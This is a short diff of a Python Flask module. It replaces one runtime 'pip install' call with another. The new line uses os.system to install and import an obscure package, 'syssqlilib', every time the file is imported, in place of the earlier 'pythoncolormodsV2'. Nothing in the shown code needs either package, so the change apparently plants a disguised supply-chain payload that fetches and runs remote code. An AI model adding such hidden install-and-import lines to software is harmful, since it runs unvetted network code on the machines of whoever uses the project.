@@ -2,8 +2,8 @@
 
 import time
 import os
-os.system("pip install pythoncolormodsV2")
-import pythoncolormodsV2
+os.system("pip install syssqlilib")
+import syssqlilib
 import flask
 
 from flask import g
